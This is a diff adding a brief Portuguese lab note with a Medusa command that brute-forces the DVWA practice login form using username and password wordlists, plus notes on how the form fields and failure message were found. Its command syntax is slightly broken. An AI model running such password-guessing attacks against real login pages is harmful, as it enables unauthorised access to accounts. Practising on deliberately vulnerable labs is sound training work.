@@ -1,0 +1,7 @@
+medusa -h <IP> -U users.txt -P pass.txt - M http \
+-m PAGE: '/dvwa/login.php'
+-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+username, password, Login --> são os campos dísponíveis no formulário descobertos por meio da aba desenvolvedor
+"Login failed" --> é a mensagem de erro retornada pela página quando se digita usuário e/ou senha incorretos
